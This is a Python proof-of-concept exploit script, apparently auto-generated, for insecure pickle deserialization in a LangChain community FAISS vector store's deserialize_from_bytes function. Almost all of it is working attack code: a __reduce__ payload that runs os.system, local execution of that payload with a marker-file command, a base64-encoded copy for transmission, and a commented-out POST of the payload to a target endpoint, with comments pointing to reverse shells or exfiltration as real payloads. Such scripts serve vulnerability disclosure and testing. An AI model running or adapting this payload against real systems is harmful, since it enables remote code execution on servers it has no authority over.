#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-015
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_directly_deserialize_from_bytes.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for insecure pickle deserialization in
langchain-community-only's FAISS vector store deserialize_from_bytes.

Vulnerability: The function deserialize_from_bytes directly calls pickle.loads()
on attacker-controlled bytes without any sanitization or validation.
Pickle deserialization can execute arbitrary code during unpickling.

Impact: Remote Code Execution (RCE) when an attacker can supply serialized bytes
to this function.

This PoC demonstrates the vulnerability by creating a malicious pickle payload
that creates a marker file at /tmp/poc_success.txt when deserialized.
"""

import pickle
import os
import sys
import base64
import subprocess
import tempfile

# =============================================================================
# Configuration
# =============================================================================
# In a real attack scenario, this would be the URL of the vulnerable endpoint.
# For this PoC, we demonstrate the exploit locally by directly calling the
# vulnerable function.
TARGET_URL = "http://localhost:8080/api/v1/trigger"  # Example target

# =============================================================================
# Step 1: Create a malicious pickle payload
# =============================================================================
class MaliciousPickle:
    """
    A class whose __reduce__ method returns a callable and arguments
    that will be executed during unpickling.
    
    This is the standard technique for crafting pickle RCE payloads.
    """
    def __reduce__(self):
        # Benign payload: create a marker file to prove code execution
        # In a real attack, this could be a reverse shell or data exfiltration
        cmd = "touch /tmp/poc_success.txt"
        return (os.system, (cmd,))

def create_malicious_pickle() -> bytes:
    """
    Creates a pickle payload that executes a benign command when deserialized.
    
    Returns:
        bytes: The serialized malicious pickle payload
    """
    malicious_obj = MaliciousPickle()
    payload = pickle.dumps(malicious_obj)
    return payload

# =============================================================================
# Step 2: Demonstrate the vulnerability locally
# =============================================================================
def demonstrate_local_exploit():
    """
    Demonstrates the vulnerability by:
    1. Creating a malicious pickle payload
    2. Simulating what happens when deserialize_from_bytes processes it
    
    This shows that arbitrary code execution is possible via pickle.loads().
    """
    print("[*] Step 1: Creating malicious pickle payload...")
    payload = create_malicious_pickle()
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Base64 encoded payload: {base64.b64encode(payload).decode()}")
    
    print("\n[*] Step 2: Demonstrating that pickle.loads() executes our code...")
    print("[*] The payload will execute: touch /tmp/poc_success.txt")
    
    # Remove marker file if it exists
    if os.path.exists("/tmp/poc_success.txt"):
        os.remove("/tmp/poc_success.txt")
    
    # This is the vulnerable call - pickle.loads() on attacker-controlled data
    # In the real library, this happens inside deserialize_from_bytes()
    try:
        result = pickle.loads(payload)
        print(f"[*] pickle.loads() returned: {result}")
    except Exception as e:
        print(f"[!] pickle.loads() raised: {e}")
        print("[*] This is expected - the command may have executed before the error")
    
    # Check if the marker file was created
    if os.path.exists("/tmp/poc_success.txt"):
        print("\n[+] SUCCESS: Marker file /tmp/poc_success.txt was created!")
        print("[+] This proves arbitrary code execution is possible via pickle.loads()")
        print("[+] The vulnerability is confirmed: deserialize_from_bytes() is exploitable")
        
        # Clean up
        os.remove("/tmp/poc_success.txt")
        print("[*] Cleaned up marker file")
    else:
        print("\n[-] Marker file was not created")
        print("[*] This might be due to permissions or the command not executing")
        print("[*] Try a different command or check system logs")

# =============================================================================
# Step 3: Simulate the full attack chain (optional)
# =============================================================================
def simulate_full_attack_chain():
    """
    Simulates how an attacker would exploit this in a real scenario:
    1. Create malicious pickle payload
    2. Encode it for transmission (e.g., base64)
    3. Send it to the vulnerable endpoint
    4. The endpoint calls deserialize_from_bytes() which calls pickle.loads()
    5. Code execution occurs
    
    Note: This requires a running instance of the vulnerable application.
    """
    print("\n[*] Simulating full attack chain (requires running target)...")
    print(f"[*] Target URL: {TARGET_URL}")
    
    payload = create_malicious_pickle()
    encoded_payload = base64.b64encode(payload).decode()
    
    print(f"[*] Base64 payload: {encoded_payload[:50]}...")
    print("[*] In a real attack, this payload would be sent to the vulnerable endpoint")
    print("[*] The endpoint would call deserialize_from_bytes() with this data")
    print("[*] Result: Remote Code Execution on the server")
    
    # Example of how the payload might be sent (commented out for safety)
    """
    import requests
    try:
        response = requests.post(
            TARGET_URL,
            json={"serialized": encoded_payload},
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:200]}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")
        print("[*] This is expected if the target is not running")
    """

# =============================================================================
# Main execution
# =============================================================================
def main():
    """
    Main function that demonstrates the vulnerability.
    """
    print("=" * 60)
    print("PoC: Insecure Pickle Deserialization in langchain-community-only")
    print("=" * 60)
    print()
    
    # Demonstrate the vulnerability locally
    demonstrate_local_exploit()
    
    # Optionally simulate the full attack chain
    simulate_full_attack_chain()
    
    print("\n" + "=" * 60)
    print("Exploit demonstration complete")
    print("=" * 60)
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
